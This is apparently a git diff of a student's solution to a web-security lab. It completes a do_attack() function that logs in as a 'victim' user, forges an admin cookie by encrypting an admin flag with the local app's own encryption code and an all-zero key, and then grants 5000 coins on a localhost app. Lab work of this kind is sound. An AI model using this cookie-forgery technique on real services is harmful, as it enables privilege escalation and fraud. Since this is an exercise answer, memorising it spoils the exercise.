@@ -1,4 +1,5 @@
 from requests import codes, Session
+import app
 
 LOGIN_FORM_URL = "http://localhost:8080/login"
 SETCOINS_FORM_URL = "http://localhost:8080/setcoins"
@@ -22,11 +23,20 @@ def do_setcoins_form(sess,uname, coins):
 def do_attack():
 	sess = Session()
   #you'll need to change this to a non-admin user, such as 'victim'.
-	uname =""
-	pw = ""
+	uname ="victim"
+	pw = "victim"
 	assert(do_login_form(sess, uname,pw))
 	#Maul the admin cookie in the 'sess' object here
-  
+	# print('@@', sess.cookies)
+
+	#----------------
+	encryption_key = b'\x00'*16
+	cbc = app.api.encr_decr.Encryption(encryption_key)
+	admin_cookie_pt = app.api.encr_decr.format_plaintext(int(True), pw)
+	ctxt = cbc.encrypt(admin_cookie_pt)
+	sess.cookies.set('admin', ctxt.hex(), domain='localhost.local', path='/')
+	# print('@@', sess.cookies)
+
 	target_uname = uname
 	amount = 5000
 	result = do_setcoins_form(sess, target_uname,amount)
